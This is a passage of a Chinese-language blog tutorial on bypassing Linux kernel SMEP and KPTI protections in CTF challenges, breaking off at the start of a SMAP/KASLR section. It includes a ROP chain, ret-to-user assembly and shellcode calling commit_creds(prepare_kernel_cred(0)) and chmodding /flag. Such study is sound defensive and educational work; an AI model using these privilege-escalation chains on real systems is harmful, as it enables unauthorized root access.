{"title":"Linux Kernel 保护机制绕过","uid":"ca9ebcc3809bcde27e81d904c30455e1","slug":"Linux Kernel 保护机制绕过","date":"2022-07-19T10:48:45.000Z","updated":"2023-04-12T02:36:51.327Z","comments":true,"path":"api/articles/Linux Kernel 保护机制绕过.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/kernelcover.png","content":"<h1 id=\"Linux-Kernel-保护机制绕过\"><a href=\"#Linux-Kernel-保护机制绕过\" class=\"headerlink\" title=\"Linux Kernel 保护机制绕过\"></a>Linux Kernel 保护机制绕过</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>好久没搞kernel的洞了，最近分析的这方面的洞有点多，相关的Exp任务也比较多，因此学习总结一下方便查找和记忆。</p></blockquote>\n<h2 id=\"SMEP-KPTI-bypass\"><a href=\"#SMEP-KPTI-bypass\" class=\"headerlink\" title=\"SMEP + KPTI bypass\"></a>SMEP + KPTI bypass</h2><p>​        SMEP是SupervisorModeExecutionPrevention的缩写，主要的作用其实就是抵御类似ret2user这样的攻击，简单来说就是阻止内核执行用户态传递的代码。</p>\n<p>​        检测计算机是否开启SMEP保护的方式很简单，<code>cat /proc/cpuinfo | grep smep</code>，如果有匹配到一些信息的话就说明计算机开启了SMEP保护。在CTF赛事中一般会给一些kernel启动的sh脚本，从这些脚本里面我们也可以看出虚拟机在启动kernel时是否开启了SMEP保护：</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\"><span class=\"token shebang important\">#!/bin/sh</span>\n\nqemu-system-x86_64 -initrd initramfs.cpio <span class=\"token punctuation\">\\</span>\n-kernel bzImage <span class=\"token punctuation\">\\</span>\n-append <span class=\"token string\">'console=ttyS0 oops=panic panic=1 nokaslr'</span> <span class=\"token punctuation\">\\</span>\n-monitor /dev/null <span class=\"token punctuation\">\\</span>\n-m 64M --nographic <span class=\"token punctuation\">\\</span>\n-smp <span class=\"token assign-left variable\">cores</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>,threads<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token punctuation\">\\</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里是没开启SMEP的脚本，如果在脚本里面加入SMEP相关的cpu参数那么就是开启了SMEP机制。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\"><span class=\"token shebang important\">#!/bin/sh</span>\n\nqemu-system-x86_64 -initrd initramfs.cpio <span class=\"token punctuation\">\\</span>\n-kernel bzImage <span class=\"token punctuation\">\\</span>\n-append <span class=\"token string\">'console=ttyS0 oops=panic panic=1 nokaslr'</span> <span class=\"token punctuation\">\\</span>\n-monitor /dev/null <span class=\"token punctuation\">\\</span>\n-m 64M --nographic <span class=\"token punctuation\">\\</span>\n-smp <span class=\"token assign-left variable\">cores</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>,threads<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token punctuation\">\\</span>\n-cpu kvm64,smep<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>还有一种判断SMEP机制是否开启的方法是通过cr4寄存器的值：<img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220319114934180.png\" alt=\"image-20220319114934180\"></p>\n<p>第20位代表的就是SMEP机制是否开启，获取cr4寄存器值的方法也很简单，一种可以通过debuger去attach要调试的kernel，另一种就是通过触发SMEP机制的crash<img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220319123657869.png\" alt=\"image-20220319123657869\"></p>\n<p>​        KPTI机制更多的是一种页表隔离的机制，当在用户态和内核态之间进行状态切换的时候KPTI机制会尽量减少用户态页表中的内核地址，同时内核页表中所有的用户态页都被设置为NX使得用户态的页不具备可执行权限，这是一种防范<code>Meltdown</code>类似攻击的机制。</p>\n<p>​        检测KPTI机制是否开启的方法有很多，<code>cat /proc/cpuinfo | grep pti</code>或者类似上面说到的cpu参数<code>-cpu kvm64,smep</code>，或者检查进程页表，但是这需要你可以查看物理内存，通过内核任意读取的原语可以做到，但是需要进行虚拟地址和物理地址之间的转换，这就需要你具备一定的内存管理知识和多级页表相关知识，这些基础知识这里就不细说了，下面举例一些demo看如何获取相关物理地址。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>pgd <span class=\"token operator\">=</span> <span class=\"token function\">get_current</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-&gt;</span>mm<span class=\"token operator\">-&gt;</span>pgd<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>get_current() 会帮助获取当前的<code>task_struct</code>，然后得到<code>mm_struct</code>结构体类型的mm成员，所有的进程地址空间都包含该结构体里面，其中pgd字段代表的是全局页目录，拿到地址之后进行页表地址转换就可以拿到对应的物理地址，那么在多级页表的处理过程中可以拿到每一级页表的入口地址，该地址的NX bit就表明该页表是否开启了NX，结论就是，正常情况下每一级页表的NX位是没设置的，但是全局页目录设置了NX bit，因为在多级页表解析的过程中全局页目录是共享的。</p>\n<h3 id=\"ROP绕过\"><a href=\"#ROP绕过\" class=\"headerlink\" title=\"ROP绕过\"></a>ROP绕过</h3><p>​        内核里面的rop和用户态其实是非常相似的，做rop最基本的就是先获取到<code>vmlinux</code>，以ctf赛题来说一般提供的都是压缩后的bzImage，这里可以通过<a href=\"https://github.com/marin-m/vmlinux-to-elf\">vmlinux-to-elf</a>工具来实现解压缩：</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">./vmlinux-to-elf <span class=\"token operator\">&lt;</span>input_kernel.bin<span class=\"token operator\">&gt;</span> <span class=\"token operator\">&lt;</span>output_kernel.elf<span class=\"token operator\">&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后通过ROPgadget或者ropper从vmlinux里面获取gadget</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">ROPgadget --binary vmlinux <span class=\"token operator\">&gt;</span> gadgets<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>gadget的寻找原则其实不是固定的，要看场景丁需求，不过类似<code>mov esp, 0xf7000000 ; ret</code>这样的一般都很不错（注意常量一定要对齐），可以将esp指向我们分配的地址然后接下来的ret操作就容易被控制进而执行rop链。但是ROPgadget是不会检查相关段是否开启了NX的。</p>\n<p>​        对于SMEP来说，它由<code>cr4</code>寄存器控制，因此可以通过改变<code>cr4</code>寄存器的第20 bit的值来进行绕过，比如使用<code>native_write_cr4</code>函数：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">native_write_cr4</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> val<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> bits_missing <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\nset_register<span class=\"token operator\">:</span>\n\t<span class=\"token keyword\">asm</span> <span class=\"token keyword\">volatile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov %0,%%cr4\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"+r\"</span> <span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"+m\"</span> <span class=\"token punctuation\">(</span>cr4_pinned_bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">static_branch_likely</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cr_pinning<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">unlikely</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>val <span class=\"token operator\">&amp;</span> cr4_pinned_bits<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> cr4_pinned_bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\tbits_missing <span class=\"token operator\">=</span> <span class=\"token operator\">~</span>val <span class=\"token operator\">&amp;</span> cr4_pinned_bits<span class=\"token punctuation\">;</span>\n\t\t\tval <span class=\"token operator\">|=</span> bits_missing<span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">goto</span> set_register<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token comment\">/* Warn after we've set the missing bits. */</span>\n\t\t<span class=\"token function\">WARN_ONCE</span><span class=\"token punctuation\">(</span>bits_missing<span class=\"token punctuation\">,</span> <span class=\"token string\">\"CR4 bits went missing: %lx!?\\n\"</span><span class=\"token punctuation\">,</span>\n\t\t\t  bits_missing<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">EXPORT_SYMBOL</span><span class=\"token punctuation\">(</span>native_write_cr4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但是从代码里面的警告就可以看出，在较新版本的内核中，该函数已经不能改变第20bit和第21bit的值了，</p>\n<p>​        对于<code>KPTI</code>就比较麻烦了，一种方法是如果具备内核任意读写和当前进程页表的地址，那么就可以直接通过关闭NX bit来实现，但是都任意读写了，直接修改cred结构体可能会更香一点。那么最好的方式其实应该去利用kernel本身的代码来帮助实现这一绕过过程，下面是<a href=\"https://github.com/torvalds/linux/blob/7ac63f6ba5db5e2e81e4674551d6f9ec58e70618/arch/x86/entry/entry_64.S\">kernel entry</a>的部分代码，主要是用于内核态到用户态的切换，这其实很符合exp的需求，原本exp不能成功执行的主要原因就是在返回用户态之后执行的代码所在页其实属于内核，这个切换它成功的进行了页表切换，因接下来用到的就是用户态的页表，。</p>\n<pre class=\"line-numbers language-asm\" data-language=\"asm\"><code class=\"language-asm\">GLOBAL(swapgs_restore_regs_and_return_to_usermode)\n#ifdef CONFIG_DEBUG_ENTRY\n\t/* Assert that pt_regs indicates user mode. */\n\ttestb\t$3, CS(%rsp)\n\tjnz\t1f\n\tud2\n1:\n#endif\n\tPOP_REGS pop_rdi=0\n\n\t/*\n\t * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.\n\t * Save old stack pointer and switch to trampoline stack.\n\t */\n\tmovq\t%rsp, %rdi\n\tmovq\tPER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp\n\n\t/* Copy the IRET frame to the trampoline stack. */\n\tpushq\t6*8(%rdi)\t/* SS */\n\tpushq\t5*8(%rdi)\t/* RSP */\n\tpushq\t4*8(%rdi)\t/* EFLAGS */\n\tpushq\t3*8(%rdi)\t/* CS */\n\tpushq\t2*8(%rdi)\t/* RIP */\n\n\t/* Push user RDI on the trampoline stack. */\n\tpushq\t(%rdi)\n\n\t/*\n\t * We are on the trampoline stack.  All regs except RDI are live.\n\t * We can do future final exit work right here.\n\t */\n\tSTACKLEAK_ERASE_NOCLOBBER\n\n\tSWITCH_TO_USER_CR3_STACK scratch_reg=%rdi\n\n\t/* Restore RDI. */\n\tpopq\t%rdi\n\tSWAPGS\n\tINTERRUPT_RETURN<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>到此，其实就不难理解为什么kernel exp里面很多类似这样的ROP code:</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">pivot_stack<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xcafedeadbeef</span><span class=\"token punctuation\">;</span>\n\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi<span class=\"token punctuation\">;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> prepare_kernel_cred<span class=\"token punctuation\">;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdx<span class=\"token punctuation\">;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cmp<span class=\"token punctuation\">;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> mov_rdi_rax<span class=\"token punctuation\">;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> commit_creds<span class=\"token punctuation\">;</span>\n\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> kpti_trampoline<span class=\"token punctuation\">;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x12345678</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// RAX</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x87654321</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// RDI</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>u_code<span class=\"token punctuation\">;</span> <span class=\"token comment\">//userspace_rip;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//userspace_cs;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x246</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//userspace_rflags;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>u_stack<span class=\"token punctuation\">;</span> <span class=\"token comment\">//userspace_rsp;</span>\npivot_stack<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x2b</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//userspace_ss;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>至于最开始的0xcafedeadbeef，这其实是为了触发<code>page fault handler</code>，因此根据linux demand-on-paging的原则，只有触发该handler的情况下才会真正mmaping。</p>\n<p>​        还有一种方法是通过<a href=\"https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/\">signal handler</a>。</p>\n<h3 id=\"get-root\"><a href=\"#get-root\" class=\"headerlink\" title=\"get root\"></a>get root</h3><p>​        获取root权限的方式在内核里面还算比较统一的，基本很多都是通过</p>\n<ol>\n<li><code>commit_creds(prepare_kernel_cred(0))</code>。</li>\n<li>确定cred structure结构体的地址来进行权限提升。</li>\n<li>ctf里面可能会用到的方法就是通过chmod 修改flag文件为777权限然后挂起，然后通过用户空间的一个进程来读取文件内容。</li>\n</ol>\n<p>​    那么shellcode的写法就比较直接了，假设通过<code>cat /proc/kallsyms</code>得到了<code>grep commit_creds</code>和<code>grep prepare_kernel_cred</code>的地址：</p>\n<pre class=\"line-numbers language-asm\" data-language=\"asm\"><code class=\"language-asm\">xor rdi, rdi\nmov rcx, prepare_kernel_cred_addr\ncall rcx\nmov rdi, rax\nmov rcx, commit_creds_addr\ncall rcx\nret<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这种shellcode没有做内核地址空间与用户地址空间的转换，因此可能比较局限，适用于仅仅存在一个<code>retun 0</code>类似指令的目标函数。为了适配更多的场景，需要做内核态和用户态的上下文切换，在linux kernel <a href=\"https://github.com/torvalds/linux/blob/master/arch/x86/entry/entry_64.S\">源码</a>中详细介绍了如何进入内核态：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to r11,then loads new ss, cs, and rip from previously programmed MSRs.rflags gets masked by a value from another MSR (so CLD and CLACare not needed). SYSCALL does not save anything on the stackand does not change rsp.</p>\n<p>注：<a href=\"https://wiki.osdev.org/Model_Specific_Registers\">MSR</a></p></blockquote>\n<p>从内核态返回用户态可以通过Linux提供的一些指令<code>SYSRET</code>，<code>SYSEXIT</code>，<code>IRET</code>，其中SYSRET和IRET可以适用于所有的CPU供应商，并且被包含在<code>x86_64</code>的标准里面，SYSRET需要利用MSR特殊读写指令因而较为麻烦，因此一般采用<code>IRET</code>。该指令的含义就是从中断返回，通过查看AMD64手册可以看出在保护模式下<code>IRET</code>对应<code>IRETQ</code>，那么我们只需要在执行<code>IRETQ</code>之前按顺序放置好RIP, CS, RFLAGS, RSP, SS，最后还需要知道的时候<code>swapgs</code>指令，它的语义是：Exchange GS base with KernelGSBase MSR，在linux syscall entry的代码哪里也存在该指令的调用，因此在通过system call返回用户空间的时候我们需要再做一次<code>swapgs</code>用于恢复GS。</p>\n<pre class=\"line-numbers language-asm\" data-language=\"asm\"><code class=\"language-asm\">swapgs\n\npush userspace_ss\npush userspace_rsp\npush userspace_rflags\npush userspace_cs\npush userspace_rip\niretq<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​        还有一种方法就是上述的第三条，第一步需要先找到chmod func的地址：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220320092704328.png\" alt=\"image-20220320092704328\"></p>\n<p>可以看到<code>__x64_sys_chmod</code>的地址是<code>0xffffffff872dacf0</code>，在内核调试中对该地址下断点就可以得到该如何给它附加参数：</p>\n<pre class=\"line-numbers language-asm\" data-language=\"asm\"><code class=\"language-asm\">movzx  edx, word ptr [rdi + 0x68]\nmov    rsi, qword ptr [rdi + 0x70]\nmov    edi, 0xffffff9c\ncall   0xffffffff811a1b50<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>不过要记得，<code>/flag</code>字符串存放地址应该使用内核空间地址，同时由于Linux kernel本身采用的是<strong>Non-Preemptive Threading Model</strong>，因此在kernel thred的执行过程中一般不会进行上下文切换，除非调用了特殊的API，通过sleep当前thread其实就是一个很好的迫使kernel进行上下文切换的，当然kernel里面的sleep和用户态有很大的差别，需要调用不同的API，这里我选择的是msleep():</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220320101601670.png\" alt=\"image-20220320101601670\"></p>\n<p>那么，完整的shellcode就有了：</p>\n<pre class=\"line-numbers language-asm\" data-language=\"asm\"><code class=\"language-asm\">; commit_cred(prepare_kernel_creds(0))\nxor rdi, rdi\nmov rcx, prepare_kernel_cred_addr\ncall rcx\nmov rdi, rax\nmov rcx, commit_creds_addr\ncall rcx\n\n; chmod 777 flag\nmov r15, 0x67616c662f\nmov r14, 0xdeadf00\nmov [r14], r15\nmov rdi, 0xffffff9c\nmov rsi, r14\nmov rdx, 0777\nmov rcx, x64_chmod_addr\ncall rcx\n\n; msleep(0x1000000)\nmov rdi, 0x1000000\nmov rcx, msleep_addr\ncall rcx\nint 3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后我们让exp在后台执行，前台执行<code>cat flag</code>实现文件读取。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>​        在通过ROP编写shellcode的时候要注意两点：</p>\n<ol>\n<li>在exp中的mmap产生的shellcode地址不在之前kernel访问的页表里面，那么在执行的时候就会触发<a href=\"https://en.wikipedia.org/wiki/Double_fault#:~:text=On%20the%20x86%20architecture%2C%20a,interrupt%20handler%20resides%20is%20invalid.\">double fault</a>。</li>\n<li>栈指针必须在向上向下两个方向上都还剩比较宽阔的空间<code>unsigned long *pivot_stack = mmap((void *)0xf7000000-0x1000, 0x1000+0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);</code>，因为Linux kernel func 比如 <code>commit_creds</code>需要使用栈空间并且不能使用低于0xf7000000大小的地址，否则会引起uncatchable page fault，<code>MAP_GROWSDOWN</code>是无效的，因为它只能用于用户态。</li>\n</ol>\n<h2 id=\"SMEP-PTI-SMAP-KASLR-bypass\"><a href=\"#SMEP-PTI-SMAP-KASLR-bypass\" class=\"headerlink\" title=\"SMEP+PTI+SMAP+KASLR bypass\"></a>SMEP+PTI+SMAP+KASLR bypass</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 